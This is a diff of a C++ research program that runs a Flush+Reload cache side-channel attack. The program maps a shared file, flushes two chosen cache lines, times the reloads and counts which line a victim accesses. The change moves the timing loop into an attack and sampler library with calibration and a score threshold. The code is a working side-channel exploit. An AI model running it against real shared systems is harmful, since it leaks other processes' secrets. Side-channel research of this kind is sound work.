@@ -1,23 +1,25 @@
+#include "../lib/attack/attack.hpp"
+#include "../lib/sampling/sampler_primitives.hpp"
+#include "../lib/sampling/samplers.hpp"
+#include "../lib/utils/memory_wrapper.hpp"
 #include "../main/utils/cacheutils.h"
 #include "../main/utils/intel.h"
-#include <cstdlib>
-#include <fcntl.h>
 #include <iostream>
-#include <sys/mman.h>
-#include <sys/stat.h>
-#include <sys/types.h>
 
-const size_t LIMIT = 100;
+const size_t SAMPLE_MEASURE_DELAY = 50000;
+const size_t BETWEEN_ITEMS_DELAY = 10000;
+const double MIN_SCORE = 1.0;
 
-char* get_file(char* path)
+
+Attack getAttack(char* path, size_t first_index, size_t second_index)
 {
-    uint offset = 0;
-    int fd = open(path, O_RDONLY);
-
-    if (fd < 3) return nullptr;
-    char* addr = (char*)mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
-    if (addr == (void*)-1) return nullptr;
-    return addr;
+    MemoryWrapper wrapper(path);
+    std::vector<size_t> indexes = { first_index, second_index };
+    std::unique_ptr<FlushSamplerPrimitive> primitive = std::make_unique<FlushSamplerPrimitive>();
+    std::unique_ptr<Sampler> sampler = std::make_unique<ListSampler>(indexes, SAMPLE_MEASURE_DELAY, BETWEEN_ITEMS_DELAY, std::move(primitive));
+    Attack attack(wrapper, AttackType::FlushReload, std::move(sampler));
+    attack.calibrate();
+    return attack;
 }
 
 int main(int argc, char* argv[])
@@ -38,30 +40,28 @@ int main(int argc, char* argv[])
         return 1;
     }
 
-    char* base_addr = get_file(argv[1]);
+    Attack attack = getAttack(path, addr0, addr1);
 
     uint total0 = 0;
     uint total1 = 0;
     while (true)
     {
-        flush(base_addr + addr1);
-        int result1 = probe_timing(base_addr + addr1);
-        flush(base_addr + addr0);
-        int result0 = probe_timing(base_addr + addr0);
 
-        if (result0 <= LIMIT)
+        for (const AttackResult& result : attack.attack())
         {
-            total0++;
-            std::cout << "Case 0 triggered with " << result0 << " cycles. Total: 0s: " << total0
-                      << " 1s: " << total1 << std::endl;
-        }
-        if (result1 <= LIMIT)
-        {
-            total1++;
-            std::cout << "Case 1 triggered with " << result1 << " cycles. Total: 0s: " << total0
-                      << " 1s: " << total1 << std::endl;
+            if (result.index == addr0 && result.score >= MIN_SCORE)
+            {
+//                std::cout << "Case 0 triggered with score: " << result.score
+//                          << " Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
+                total0++;
+            }
+            else if (result.index == addr1 && result.score >= MIN_SCORE)
+            {
+//                std::cout << "Case 1 triggered with score: " << result.score
+//                          << " cycles. Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
+                total1++;
+            }
         }
     }
-
     return 0;
 }
